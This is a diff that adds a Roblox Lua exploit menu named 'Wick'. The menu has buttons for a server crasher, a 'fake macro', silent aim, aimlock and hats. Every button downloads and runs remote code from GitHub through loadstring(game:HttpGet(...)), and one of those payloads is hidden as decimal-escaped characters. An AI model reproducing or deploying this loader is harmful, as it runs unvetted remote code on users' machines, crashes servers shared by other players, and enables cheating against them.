@@ -1,0 +1,144 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local GGGG = Instance.new("ScreenGui")
+local Frame = Instance.new("ImageLabel")
+local TextLabel = Instance.new("TextLabel")
+local Crash = Instance.new("TextButton")
+local FakeMacro = Instance.new("TextButton")
+local SilentAim = Instance.new("TextButton")
+local Aimlock = Instance.new("TextButton")
+local Hat = Instance.new("TextButton")
+
+--Properties:
+
+GGGG.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+GGGG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+GGGG.ResetOnSpawn = false
+
+
+
+Frame.Name = "Frame"
+Frame.Parent = GGGG
+Frame.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+Frame.BackgroundTransparency = 1.000
+Frame.Position = UDim2.new(0.273855686, 0, 0.201226994, 0)
+Frame.Size = UDim2.new(0, 489, 0, 361)
+Frame.Image = "rbxassetid://3570695787"
+Frame.ImageColor3 = Color3.fromRGB(36, 36, 36)
+Frame.ScaleType = Enum.ScaleType.Slice
+Frame.SliceCenter = Rect.new(100, 100, 100, 100)
+Frame.SliceScale = 0.120
+Frame.Active = true
+Frame.Draggable = true
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderColor3 = Color3.fromRGB(36, 36, 36)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(0, 0, -5.96046448e-08, 0)
+TextLabel.Size = UDim2.new(0, 489, 0, 50)
+TextLabel.Font = Enum.Font.Oswald
+TextLabel.Text = "Wick"
+TextLabel.TextColor3 = Color3.fromRGB(65, 65, 65)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+Crash.Name = "Crash"
+Crash.Parent = Frame
+Crash.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
+Crash.BackgroundTransparency = 1.000
+Crash.BorderColor3 = Color3.fromRGB(36, 36, 36)
+Crash.BorderSizePixel = 0
+Crash.Position = UDim2.new(0.744376302, 0, 0.335180044, 0)
+Crash.Size = UDim2.new(0, 125, 0, 50)
+Crash.Font = Enum.Font.Oswald
+Crash.Text = "Crash"
+Crash.TextColor3 = Color3.fromRGB(65, 65, 65)
+Crash.TextScaled = true
+Crash.TextSize = 14.000
+Crash.TextWrapped = true
+Crash.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+
+end)
+
+FakeMacro.Name = "FakeMacro"
+FakeMacro.Parent = Frame
+FakeMacro.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
+FakeMacro.BackgroundTransparency = 1.000
+FakeMacro.BorderColor3 = Color3.fromRGB(36, 36, 36)
+FakeMacro.BorderSizePixel = 0
+FakeMacro.Position = UDim2.new(0, 0, 0.335180044, 0)
+FakeMacro.Size = UDim2.new(0, 125, 0, 50)
+FakeMacro.Font = Enum.Font.Oswald
+FakeMacro.Text = "FakeMacro"
+FakeMacro.TextColor3 = Color3.fromRGB(65, 65, 65)
+FakeMacro.TextScaled = true
+FakeMacro.TextSize = 14.000
+FakeMacro.TextWrapped = true
+FakeMacro.MouseButton1Down:connect(function()
+	-- leaked by wsa
+	-- sub to WsaK on yt
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\54\54\71\100\97\71\111\100\47\85\76\69\76\69\75\74\68\115\97\47\109\97\105\110\47\70\97\107\101\109\97\99\114\111\34\41\41\40\41\10")()
+end)
+
+SilentAim.Name = "SilentAim"
+SilentAim.Parent = Frame
+SilentAim.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
+SilentAim.BackgroundTransparency = 1.000
+SilentAim.BorderColor3 = Color3.fromRGB(36, 36, 36)
+SilentAim.BorderSizePixel = 0
+SilentAim.Position = UDim2.new(0, 0, 0.62603879, 0)
+SilentAim.Size = UDim2.new(0, 125, 0, 50)
+SilentAim.Font = Enum.Font.Oswald
+SilentAim.Text = "Silent Aim"
+SilentAim.TextColor3 = Color3.fromRGB(65, 65, 65)
+SilentAim.TextScaled = true
+SilentAim.TextSize = 14.000
+SilentAim.TextWrapped = true
+SilentAim.MouseButton1Down:connect(function()
+	-- Wsa#0002/Thrax#0001
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/VoidIsFound/WXT-SA/main/WsaThraxW"))()
+end)
+
+Aimlock.Name = "Aimlock"
+Aimlock.Parent = Frame
+Aimlock.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
+Aimlock.BackgroundTransparency = 1.000
+Aimlock.BorderColor3 = Color3.fromRGB(36, 36, 36)
+Aimlock.BorderSizePixel = 0
+Aimlock.Position = UDim2.new(0.744376302, 0, 0.62603879, 0)
+Aimlock.Size = UDim2.new(0, 125, 0, 50)
+Aimlock.Font = Enum.Font.Oswald
+Aimlock.Text = "Silent Aim"
+Aimlock.TextColor3 = Color3.fromRGB(65, 65, 65)
+Aimlock.TextScaled = true
+Aimlock.TextSize = 14.000
+Aimlock.TextWrapped = true
+Aimlock.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(("https://raw.githubusercontent.com/Kphta/christmas-2/main/2.0"),true))()
+end)
+
+Hat.Name = "Hat"
+Hat.Parent = Frame
+Hat.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
+Hat.BackgroundTransparency = 1.000
+Hat.BorderColor3 = Color3.fromRGB(36, 36, 36)
+Hat.BorderSizePixel = 0
+Hat.Position = UDim2.new(0.372188151, 0, 0.473684222, 0)
+Hat.Size = UDim2.new(0, 125, 0, 50)
+Hat.Font = Enum.Font.Oswald
+Hat.Text = "Hats"
+Hat.TextColor3 = Color3.fromRGB(65, 65, 65)
+Hat.TextScaled = true
+Hat.TextSize = 14.000
+Hat.TextWrapped = true
+Hat.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/carlcoded/carlispro/main/carlhub'))()
+
+end)
